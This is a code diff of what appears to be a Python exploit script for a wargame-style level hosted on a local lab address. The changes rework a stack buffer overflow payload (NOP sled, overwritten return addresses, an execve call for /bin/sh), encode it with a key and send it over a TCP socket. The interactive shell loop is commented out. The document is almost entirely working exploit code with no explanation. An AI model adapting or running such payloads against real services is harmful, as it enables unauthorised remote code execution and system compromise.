@@ -83,8 +83,7 @@ def send_exploit(s, payload,key):
    s.send(exploit)
 
    recv_banner(s)
-
-   #recv_encoded(s)
+   recv_encoded(s)
 
    return
 
@@ -108,9 +107,14 @@ def stage2_exploit(s, key):
    shell = 'CCCC'
    #shell = b'/bin/sh\x00'
 
-   payload = arg0 + arg1 + shell  
+   payload = arg0 + arg1 + shell 
 
-   send_exploit(s, payload, key)
+   payload = encode(payload, key)
+
+   s.send(b'\x10\x00\x00\x00')
+   s.send(payload)
+
+   #send_exploit(s, payload, key)
 
    return payload
 
@@ -123,25 +127,28 @@ def stage1_exploit(s, key):
   
    #.bss target is to get 0804b420
    ebp = b'\x1d\xb5\x06\x08'
-   eip1 = b'\x00\x98\x04\x08'
+
+   #ebp  = b'\x00\x00\xfa\xbf'
+
+   eip1 = b'\x53\x98\x04\x08'
    eip2 = b'\xb0\x89\x04\x08'
    execve = b'\xb0\x89\x04\x08'
 
-   '''
-    ebp
-    eip
-    ptr /bin/sh
-    argv
-    env
-   '''
-   ret = b'0000'   
+   ret  = b'\x01\x00\x00\x00'   
    exe  = b'\x10\xb5\x04\x08'
    argv = b'\x14\xb5\x04\x08'
    env  = b'\x00\x00\x00\x00'
+   env  = b'\x00\x00\x00\x00'
+   local_var = b'\x00\x00\x00\x00'
+   quit_loop = b'\x00\x00\x00\x00'
+   null2 = b'\x22\x22\x22\x22'
  
-   payload = b'\x90'*size + ebp + eip1 + eip2 + execve + ret + exe + argv + env
+   payload =  b'\x90'*size + ebp + eip1
+   payload += local_var + local_var + local_var + quit_loop
+   payload += execve + ret + exe + argv + env
 
    send_exploit(s, payload, key)
+   s.send("Q")
 
    return 
 
@@ -152,14 +159,13 @@ def pwn_lvl(s):
    stage1_exploit(s, key)
    stage2_exploit(s, key)
 
-   s.send("Q")
 
-   thread.start_new_thread(recv_thread, (s,))
+   #thread.start_new_thread(recv_thread, (s,))
 
-   print "#/bin/sh: "
-   while True:
-      cmd = raw_input() + "\n"
-      s.send(cmd)
+   #print "#/bin/sh: "
+   #while True:
+   #   cmd = raw_input() + "\n"
+   #   s.send(cmd)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.56.101', 20002))
